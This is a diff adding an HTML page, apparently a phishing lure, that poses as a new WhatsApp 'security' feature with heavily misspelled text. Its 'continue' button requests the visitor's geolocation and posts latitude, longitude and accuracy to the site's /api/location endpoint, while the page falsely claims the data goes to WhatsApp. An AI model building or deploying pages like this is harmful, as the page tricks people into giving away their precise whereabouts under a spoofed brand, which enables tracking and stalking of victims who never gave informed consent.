@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Green Connect</title>
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;background:#061b16;color:#fff;
+ font-family:Arial,sans-serif;
+ background-image:radial-gradient(#174a38 1px,transparent 1px);
+ background-size:24px 24px
+}
+header{
+ background:#075e46;padding:17px 22px;
+ display:flex;align-items:center;gap:13px;
+ border-bottom:1px solid #27b879
+}
+.logo{font-size:30px;color:#fff}
+header h2{margin:0;font-size:21px}
+header small{color:#c5f5dc}
+main{max-width:560px;margin:35px auto;padding:18px}
+.hero{text-align:center;padding:20px 5px}
+.art{
+ width:115px;height:115px;margin:auto;
+ border-radius:30px;background:#0d392b;
+ border:2px solid #25d366;
+ display:grid;place-items:center;
+ font-size:58px;color:#25d366;
+ box-shadow:0 0 35px #25d36644
+}
+h1{font-size:32px;line-height:1.2}
+h1 span{color:#25d366}
+p{color:#bdd7ca;line-height:1.65}
+.card{
+ background:#0d2a21;border:1px solid #23684d;
+ border-radius:19px;padding:23px;margin-top:25px;
+ box-shadow:0 15px 40px #0007
+}
+.card h2{color:#43df91}
+.location{
+ display:flex;align-items:center;gap:14px;
+ padding:15px;background:#123a2c;
+ border-radius:13px;margin:20px 0
+}
+.pin{font-size:30px;color:#25d366}
+.notice{
+ background:#102f25;padding:13px;
+ border-radius:10px;font-size:13px;
+ border:1px solid #285c47
+}
+button{
+ width:100%;padding:16px;border:0;
+ border-radius:10px;background:#25d366;
+ color:#052a1b;font-size:16px;
+ font-weight:bold;margin-top:13px
+}
+.secondary{background:#23483a;color:white}
+#status{overflow-wrap:anywhere}
+footer{text-align:center;padding:25px;color:#8fb6a2;font-size:12px}
+</style>
+</head>
+<body>
+<header>
+ <div class="logo">●</div>
+ <div>
+  <h2>Securty Connect</h2>
+  <small>securty</small>
+ </div>
+</header>
+
+<main>
+<section class="hero">
+ <div class="art">⌖</div>
+ <h1>Stay Connected.<br><span>Continue Your Secuerty.</span></h1>
+ <p>Choose and Continue your securty.</p>
+</section>
+
+<section class="card">
+ <h2>CONTINUE SECURTY</h2>
+ <p>Your securty will only be press the button and approve your browser's securty fetuers.</p>
+
+ <div class="location">
+  <div class="pin">⌖</div>
+  <div>
+   <b>Current Location</b>
+   <p style="margin:5px 0 0">Your device location</p>
+  </div>
+ </div>
+
+ <div class="notice">
+  This is an independent service for new securty function on WhatsApp. Your securty will be sent to the WAHTSAAP server when you choose to continue.
+ </div>
+
+ <button onclick="shareLocation()">CONTINUE FOR SCUERE </button>
+ <button class="secondary" onclick="document.getElementById('status').textContent='shareLocation.'">MAYBE LATER</button>
+ <p id="status" aria-live="polite">Location has not been shared.</p>
+</section>
+</main>
+
+<footer>SECURTY CONECTED · CONTINUE FOR SECURTY REASIOAN </footer>
+
+<script>
+function shareLocation(){
+ const status=document.getElementById("status");
+ if(!navigator.geolocation){
+  status.textContent="Location is not supported.";
+  return;
+ }
+ status.textContent="Please give permission...";
+ navigator.geolocation.getCurrentPosition(async pos=>{
+  status.textContent="Sending your Securty requast...";
+  try{
+   const response=await fetch("/api/location",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+     consent:true,
+     latitude:pos.coords.latitude,
+     longitude:pos.coords.longitude,
+     accuracy:pos.coords.accuracy
+    })
+   });
+   status.textContent=response.ok
+    ?"Location shared successfully."
+    :"Server error: location was not accepted.";
+  }catch(e){
+   status.textContent="Unable to connect to server.";
+  }
+ },()=>{
+  status.textContent="Permission denied or location send scussfuly.";
+ });
+}
+</script>
+</body>
+</html>
